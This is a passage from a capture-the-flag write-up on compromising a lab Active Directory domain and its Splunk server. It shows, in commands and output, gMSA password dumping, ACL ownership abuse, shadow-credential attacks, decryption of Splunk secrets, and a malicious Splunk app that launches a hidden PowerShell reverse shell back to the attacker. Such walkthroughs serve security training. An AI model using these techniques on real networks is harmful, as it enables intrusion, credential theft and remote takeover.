PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : 037088f8-0ae1-11d2-b422-00a0c968f939
InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty, WriteProperty
InheritanceType       : All
ObjectType            : 5b47d60f-6090-40b2-9f37-2a4de88f3063
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : HAZE\Key Admins
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty, WriteProperty
InheritanceType       : All
ObjectType            : 5b47d60f-6090-40b2-9f37-2a4de88f3063
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : HAZE\Enterprise Key Admins
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : Self
InheritanceType       : Descendents
ObjectType            : 9b026da6-0d3c-465c-8bee-5199d7165cba
InheritedObjectType   : bf967a86-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : CREATOR OWNER
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : Self
InheritanceType       : Descendents
ObjectType            : 9b026da6-0d3c-465c-8bee-5199d7165cba
InheritedObjectType   : bf967a86-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : b7c69e6d-2cc7-11d2-854e-00a0c983f608
InheritedObjectType   : bf967a86-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : b7c69e6d-2cc7-11d2-854e-00a0c983f608
InheritedObjectType   : bf967a9c-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty
InheritanceType       : Descendents
ObjectType            : b7c69e6d-2cc7-11d2-854e-00a0c983f608
InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : WriteProperty
InheritanceType       : Descendents
ObjectType            : ea1b7b93-5e48-46d5-bc6c-4df4fda78a35
InheritedObjectType   : bf967a86-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : GenericRead
InheritanceType       : Descendents
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 4828cc14-1437-45bc-9b07-ad6f015e5f28
ObjectFlags           : InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : GenericRead
InheritanceType       : Descendents
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : bf967a9c-0de6-11d0-a285-00aa003049e2
ObjectFlags           : InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : GenericRead
InheritanceType       : Descendents
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags           : InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly

ActiveDirectoryRights : ReadProperty, WriteProperty
InheritanceType       : All
ObjectType            : 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : True
InheritanceFlags      : ContainerInherit, ObjectInherit
PropagationFlags      : None

ActiveDirectoryRights : ReadProperty, WriteProperty, ExtendedRight
InheritanceType       : All
ObjectType            : 91e647de-d96f-4b70-9557-d63ff4f3ccd8
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : GenericAll
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : HAZE\Enterprise Admins
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : ListChildren
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : BUILTIN\Pre-Windows 2000 Compatible Access
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : CreateChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead, WriteDacl, WriteOwner
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : BUILTIN\Administrators
IsInherited           : True
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

```

There’s a lot there, but I’ll try looking for just gMSA\_Managers’ access:

```

evil-winrm-py PS C:\> (Get-Acl "AD:\$($backupuser.DistinguishedName)").Access | Where-Object { $_.IdentityReference -like '*gMSA_Manage
r*' }

ActiveDirectoryRights : ReadProperty, GenericExecute
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : HAZE\gMSA_Managers
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

ActiveDirectoryRights : WriteProperty
InheritanceType       : None
ObjectType            : 888eedd6-ce04-df40-b462-b8a50e41ba38
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : HAZE\gMSA_Managers
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

```

The `ObjectType` GUID is the attribute `msDS-GroupMSAMembership` ([docs](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/c651f64d-5e92-4d12-9011-e6811ed306aa)).

#### ACL Identification Shortcuts

After solving the box, I learned that [BloodyAD](https://github.com/CravateRouge/bloodyAD) has a shortcut here:

```

oxdf@hacky$ bloodyAD --host DC01.haze.htb -d haze.htb -u mark.adams -p Ld@p_Auth_Sp1unk@2k24 get writable --detail

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=haze,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=Mark Adams,CN=Users,DC=haze,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
...[snip]...

distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
msDS-GroupMSAMembership: WRITE

```

Or the `Find-InterestingDomainAcl` function in [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1):

```

evil-winrm-py PS C:\programdata> upload /opt/PowerSploit/Recon/PowerView.ps1 PowerView.ps1
Uploading /opt/PowerSploit/Recon/PowerView.ps1: 768kB [00:03, 262kB/s]
[+] File uploaded successfully as: C:\programdata\PowerView.ps1
evil-winrm-py PS C:\programdata> . .\PowerView.ps1
evil-winrm-py PS C:\programdata> Find-InterestingDomainAcl -ResolveGUIDS | ?{$_.IdentityReferenceName -match "gMSA_Managers"}

ObjectDN                : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteProperty
ObjectAceType           : ms-DS-GroupMSAMembership
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-323145914-28650650-2368316563-1107
IdentityReferenceName   : gMSA_Managers
IdentityReferenceDomain : haze.htb
IdentityReferenceDN     : CN=gMSA_Managers,CN=Users,DC=haze,DC=htb
IdentityReferenceClass  : group

```

### Recover Credentials

I’ll set the users able to retrieve the password to mark.adams:

```

evil-winrm-py PS C:\> Set-ADServiceAccount Haze-IT-Backup -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"

```

Now I can dump the hash using `netexec`:

```

oxdf@hacky$ netexec ldap dc01.haze.htb -u mark.adams -p Ld@p_Auth_Sp1unk@2k24 --gmsa
LDAP        10.10.11.61     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) (signing:None) (channel binding:Never)
LDAP        10.10.11.61     389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
LDAP        10.10.11.61     389    DC01             [*] Getting GMSA Passwords
LDAP        10.10.11.61     389    DC01             Account: Haze-IT-Backup$      NTLM: 4de830d1d58c14e241aff55f82ecdba1     PrincipalsAllowedToReadPassword: mark.adams

```

It won’t work over NTLM auth:

```

oxdf@hacky$ netexec smb dc01.haze.htb -u Haze-IT-Backup -H 4de830d1d58c14e241aff55f82ecdba1
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [-] haze.htb\Haze-IT-Backup:4de830d1d58c14e241aff55f82ecdba1 STATUS_LOGON_FAILURE 

```

That’s because it’s a service account. It will work using Kerberos by adding `-k`:

```

oxdf@hacky$ netexec smb dc01.haze.htb -u Haze-IT-Backup -H 4de830d1d58c14e241aff55f82ecdba1 -k
SMB         dc01.haze.htb   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         dc01.haze.htb   445    DC01             [+] haze.htb\Haze-IT-Backup:4de830d1d58c14e241aff55f82ecdba1

```

## Shell as edward.martin

### Enumeration

Haze-IT-Backups has `WriteOwner` over the Support Services group:

![image-20250624124133312](/img/image-20250624124133312.png)

From my current visibility, Support\_Services has no members and no outbound control.

### Control Support\_Services

With nowhere else to look, I’ll try adding a user I control to the Support\_Services group. I’ll get a TGT for the service account:

```

oxdf@hacky$ getTGT.py haze.htb/Haze-IT-Backup\$ -hashes :4de830d1d58c14e241aff55f82ecdba1
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies   

[*] Saving ticket in Haze-IT-Backup$.ccache 

```

I’ll use that with `bloodyAD` to set the owner of the group to be this account:

```

oxdf@hacky$ KRB5CCNAME=Haze-IT-Backup\$.ccache bloodyAD --host dc01.haze.htb -d haze.htb -u 'Haze-IT-Backup$' -k set owner Support_Services 'Haze-IT-Backup$'
[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on SUPPORT_SERVICES 

```

As owner, I’ll give the account `GenericAll` over the group:

```

oxdf@hacky$ KRB5CCNAME=Haze-IT-Backup\$.ccache bloodyAD --host dc01.haze.htb -d haze.htb -u 'Haze-IT-Backup$' -k add genericAll Support_Services 'Haze-IT-Backup$'
[+] Haze-IT-Backup$ has now GenericAll on Support_Services

```

### Bloodhound

As an owner of the group, I’ll re-run Bloodhound. I wasn’t able to get Rusthound to work, so I’ll fall back to Python:

```

oxdf@hacky$ KRB5CCNAME=Haze-IT-Backup\$.ccache bloodhound-ce-python -d haze.htb -u 'Haze-IT-Backup$' -k 
-no-pass -c all -ns 10.10.11.61 --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: haze.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc01.haze.htb  
INFO: Found 1 domains
INFO: Found 1 domains in the forest                 
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 9 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 2 ous                                                  
INFO: Found 20 containers                                          
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.haze.htb
INFO: Done in 00M 17S                                              
INFO: Compressing output into 20250625013024_bloodhound.zip     

```

In this new collection, Support\_Services has some control over edward.martin:

![image-20250624133227572](/img/image-20250624133227572.png)

### Shadow Credentials

#### Set Password Fail

I typically go for a Shadow Credential here over changing the password as it’s just cleaner OPSEC. That said, if I try to change the password here, it fails. I’ll add Haze-IT-Backup$ to the group, and then try to set the password:

```

oxdf@hacky$ KRB5CCNAME=Haze-IT-Backup\$.ccache bloodyAD --host dc01.haze.htb -d haze.htb -u 'Haze-IT-Backup$' -k add groupMember Support_Services 'Haze-IT-Backup$'
[+] Haze-IT-Backup$ added to Support_Services
oxdf@hacky$ KRB5CCNAME=Haze-IT-Backup\$.ccache bloodyAD --host dc01.haze.htb -d haze.htb -u 'Haze-IT-Backup$' -k set password edward.martin '0xdf0xdf!!!'
Traceback (most recent call last):
...[snip]...
msldap.commons.exceptions.LDAPModifyException: 
Password can't be changed before -2 days, 2:59:25.821606 because of the minimum password age policy.

```

The password age policy isn’t letting me change it.

#### Shadow Credential

Instead of setting the password, I’ll use a Shadow Credential. I typically go this way anyway. After adding the Haze-IT-Backup$ account to the Support Services group, I’ll use `certipy` to set the credential:

```

oxdf@hacky$ getTGT.py haze.htb/Haze-IT-Backup\$ -hashes :4de830d1d58c14e241aff55f82ecdba1
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Haze-IT-Backup$.ccache
oxdf@hacky$ KRB5CCNAME=Haze-IT-Backup\$.ccache certipy shadow auto -username 'Haze-IT-Backup$' -account edward.martin -k -target dc01.haze.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: dc01.haze.htb.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: HAZE.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'edward.martin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'd9ffe20dccd64735b0ddbd56c80d1937'
[*] Adding Key Credential with device ID 'd9ffe20dccd64735b0ddbd56c80d1937' to the Key Credentials for 'edward.martin'
[*] Successfully added Key Credential with device ID 'd9ffe20dccd64735b0ddbd56c80d1937' to the Key Credentials for 'edward.martin'
[*] Authenticating as 'edward.martin' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'edward.martin@haze.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'edward.martin.ccache'
[*] Wrote credential cache to 'edward.martin.ccache'
[*] Trying to retrieve NT hash for 'edward.martin'
[*] Restoring the old Key Credentials for 'edward.martin'
[*] Successfully restored the old Key Credentials for 'edward.martin'
[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af

```

This gives both a TGT and the NTLM hash for edward.martin.

It’s important to get a new TGT first, as the old one doesn’t have that Haze-IT-Backup$ is in the Support\_Services group. If I don’t get a new TGT, it’ll show this error:

```

oxdf@hacky$ KRB5CCNAME=Haze-IT-Backup\$.ccache certipy shadow auto -username 'Haze-IT-Backup$' -account edward.martin -k -target dc01.haze.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: dc01.haze.htb.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: HAZE.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'edward.martin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e9ba7063a082411d9f4bbebf54e1dcf5'
[*] Adding Key Credential with device ID 'e9ba7063a082411d9f4bbebf54e1dcf5' to the Key Credentials for 'edward.martin'
[-] Could not update Key Credentials for 'edward.martin' due to insufficient access rights: 00002098: SecErr: DSID-031514B3, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0

```

That hash works:

```

oxdf@hacky$ netexec smb dc01.haze.htb -u edward.martin -H 09e0b3eeb2e7a6b0d419e9ff8f4d91af
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [+] haze.htb\edward.martin:09e0b3eeb2e7a6b0d419e9ff8f4d91af 

```

And edward.martin can WinRM:

```

oxdf@hacky$ netexec winrm dc01.haze.htb -u edward.martin -H 09e0b3eeb2e7a6b0d419e9ff8f4d91af
WINRM       10.10.11.61     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) 
WINRM       10.10.11.61     5985   DC01             [+] haze.htb\edward.martin:09e0b3eeb2e7a6b0d419e9ff8f4d91af (Pwn3d!)

```

I’ll get a shell and `user.txt`:

```

oxdf@hacky$ evil-winrm-py -i dc01.haze.htb -u edward.martin -H 09e0b3eeb2e7a6b0d419e9ff8f4d91af
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.1.1
[*] Connecting to dc01.haze.htb:5985 as edward.martin
evil-winrm-py PS C:\Users\edward.martin\Documents> cd ..\Desktop
evil-winrm-py PS C:\Users\edward.martin\Desktop> type user.txt
24bcc3d9************************

```

## Shell as alexander.green

### Enumeration

#### Find Backup

edward.martin is a member of the Backup\_Reviewers group:

![image-20250624142317391](/img/image-20250624142317391.png)

This shows up in the shell as well:

```

evil-winrm-py PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                         Attributes                                        
=========================================== ================ =========================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
HAZE\Backup_Reviewers                       Group            S-1-5-21-323145914-28650650-2368316563-1109 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448   

```

There’s no obvious control from this group in Bloodhound, but I did notice `C:\Backups` earlier. edward.martin can access it:

```

evil-winrm-py PS C:\Backups> ls

    Directory: C:\Backups

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/5/2025  12:33 AM                Splunk 

```

The only file is a zip archive:

```

evil-winrm-py PS C:\Backups\Splunk> ls

    Directory: C:\Backups\Splunk

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          8/6/2024   3:22 PM       27445566 splunk_backup_2024-08-06.zip 

```

I’ll download it:

```

evil-winrm-py PS C:\Backups\Splunk> download splunk_backup_2024-08-06.zip splunk_backup_2024-08-06.zip
Downloading C:\Backups\Splunk\splunk_backup_2024-08-06.zip: 26.2MB [00:31, 860kB/s]                                                    
[+] File downloaded successfully and saved as: /media/sf_CTFs/hackthebox/haze-10.10.11.61/splunk_backup_2024-08-06.zip

```

#### splunk\_backup\_2024-08-06.zip

Unzipping the archive creates a `Splunk` directory:

```

oxdf@hacky$ ls Splunk/
bin            etc               license-eula.txt  Python-3.7         share                                          var
cmake          lib               openssl.cnf       quarantined_files  splunk-9.2.1-78803f08aabb-windows-64-manifest
copyright.txt  license-eula.rtf  opt               README-splunk.txt  swidtag

```

The first thing to look for is hashes / encrypted passwords. Since they all seem to take the format `$[digit]$`, I’ll recursively `grep` for this:

```

oxdf@hacky$ grep -rP '\$[0-9]\$\S{15,}' Splunk/
Splunk/etc/passwd::admin:$6$8FRibWS3pDNoVWHU$vTW2NYea7GiZoN0nE6asP6xQsec44MlcK2ZehY5RC4xeTAz4kVVcbCkQ9xBI2c7A8VPmajczPOBjcVgccXbr9/::Administrator:admin:changeme@example.com:::19934
Splunk/etc/system/README/user-seed.conf.example:HASHED_PASSWORD = $6$TOs.jXjSRTCsfPsw$2St.t9lH9fpXd9mCEmCizWbb67gMFfBIJU37QF8wsHKSGud1QNMCuUdWkD8IFSgCZr5.W6zkjmNACGhGafQZj1
Splunk/etc/system/README/outputs.conf.example:token=$1$/fRSBT+2APNAyCB7tlcgOyLnAtqAQFC8NI4TGA2wX4JHfN5d9g==
Splunk/etc/system/README/inputs.conf.example:token = $7$ifQTPTzHD/BA8VgKvVcgO1KQAtr3N1C8S/1uK3nAKIE9dd9e9g==
grep: Splunk/var/lib/splunk/_introspection/db/db_1722472316_1722471805_2/1722472316-1722471805-7069930062775889648.tsidx: binary file matches
Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf:bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/server.conf:pass4SymmKey = $7$u538ChVu1V7V9pXEWterpsj8mxzvVORn8UdnesMP0CHaarB03fSbow==
Splunk/var/run/splunk/confsnapshot/baseline_local/system/local/server.conf:sslPassword = $7$C4l4wOYleflCKJRL9l/lBJJQEBeO16syuwmsDCwft11h7QPjPH8Bog==

```

There is a `splunk.secret` file, and it’s different from the live one:

```

oxdf@hacky$ cat Splunk/etc/auth/splunk.secret 
CgL8i4HvEen3cCYOYZDBkuATi5WQuORBw9g4zp4pv5mpMcMF3sWKtaCWTX8Kc1BK3pb9HR13oJqHpvYLUZ.gIJIuYZCA/YNwbbI4fDkbpGD.8yX/8VPVTG22V5G5rDxO5qNzXSQIz3NBtFE6oPhVLAVOJ0EgCYGjuk.fgspXYUc9F24Q6P/QGB/XP8sLZ2h00FQYRmxaSUTAroHHz8fYIsChsea7GBRaolimfQLD7yWGefscTbuXOMJOrzr/6B

```

All three of the `$7$` blobs crash in `splunk-secrets`. For example::

```

oxdf@hacky$ splunksecrets splunk-decrypt -S Splunk/etc/auth/splunk.secret --ciphertext '$7$C4l4wOYleflCKJRL9l/lBJJQEBeO16syuwmsDCwft11h7QPjPH8Bog=='
Traceback (most recent call last):
  File "/home/oxdf/.local/bin/splunksecrets", line 10, in <module>
    sys.exit(main())
             ^^^^^^
  File "/home/oxdf/.local/share/uv/tools/splunksecrets/lib/python3.12/site-packages/click/core.py", line 1442, in __call__
    return self.main(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/splunksecrets/lib/python3.12/site-packages/click/core.py", line 1363, in main
    rv = self.invoke(ctx)
         ^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/splunksecrets/lib/python3.12/site-packages/click/core.py", line 1830, in invoke
    return _process_result(sub_ctx.command.invoke(sub_ctx))
                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/splunksecrets/lib/python3.12/site-packages/click/core.py", line 1226, in invoke
    return ctx.invoke(self.callback, **ctx.params)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/splunksecrets/lib/python3.12/site-packages/click/core.py", line 794, in invoke
    return callback(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/splunksecrets/lib/python3.12/site-packages/splunksecrets/cli.py", line 196, in splunk_decrypt
    click.echo(decrypt(splunk_secret, ciphertext))
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/splunksecrets/lib/python3.12/site-packages/splunksecrets/splunk.py", line 70, in decrypt
    plaintext = decryptor.update(ciphertext).decode()
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xbd in position 2: invalid start byte

```

They seem to come from example files anyway. I think this is not real data.

The `authentication.conf` password is a `bindDNpassword`, just like where I found the useful password above.

```

[default]

minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0

[Haze LDAP Auth]

SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=alexander.green,CN=Users,DC=haze,DC=htb
bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_Admins,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname

[authentication]
authSettings = Haze LDAP Auth

```

This time, it’s `$1$`, an older Splunk format. The `splunk-legacy-decrypt` works here:

```

oxdf@hacky$ splunksecrets splunk-legacy-decrypt -S Splunk/etc/auth/splunk.secret --ciphertext '$1$YDz8WfhoCWmf6aTRkA+QqUI='
Sp1unkadmin@2k24

```

That’s the password for alexander.green, who is in the Splunk\_Admins group:

![image-20250624165020517](/img/image-20250624165020517.png)

Unfortunately, this password does not work for alexander.green on Haze.

#### Splunk Web

The password does work to log into the website as the admin user:

![image-20250624162041984](/img/image-20250624162041984.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

This account has admin role, as can be seen under Settings > Users:

[![image-20250624165239758](/img/image-20250624165239758.png)*Click for full size image*](/img/image-20250624165239758.png)

### Malicious App

#### Background

Huntress has a nice post for 2023, [Beware of Traitorware: Using Splunk for Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence). In this post, they walk through how to place files into the Splunk directory structure to get code running as the forwarder on a cron.

[This repo](https://github.com/0xjpuff/reverse_shell_splunk) has a template for a malicious app that makes this even easier and is made to actually upload into Splunk as a fake app.

#### Make App

I’ll clone the repo:

```

oxdf@hacky$ git clone https://github.com/0xjpuff/reverse_shell_splunk
Cloning into 'reverse_shell_splunk'...
remote: Enumerating objects: 23, done.
remote: Total 23 (delta 0), reused 0 (delta 0), pack-reused 23 (from 1)
Receiving objects: 100% (23/23), 5.16 KiB | 660.00 KiB/s, done.
Resolving deltas: 100% (4/4), done.

```

I’ll edit `bin/run.ps1` to include my IP and port 443. `default/inputs.conf` has the configuration values to run `run.bat` every 10 seconds:

```

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = pentest 

[script://.\bin\run.bat]
disabled = 0
sourcetype = pentest
interval = 10

```

I don’t have to, but I’ll remove the section on `rev.py` since I won’t be using it here (it’s targeted for Linux installs). The `.bat` file just runs `run.ps1`:

```

@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"

```

I’ll compress the directory and rename it:

```

oxdf@hacky$ tar -cvzf 0xdf.tgz reverse_shell_splunk
reverse_shell_splunk/
reverse_shell_splunk/default/
reverse_shell_splunk/default/inputs.conf
reverse_shell_splunk/bin/
reverse_shell_splunk/bin/rev.py
reverse_shell_splunk/bin/run.bat
reverse_shell_splunk/bin/run.ps1
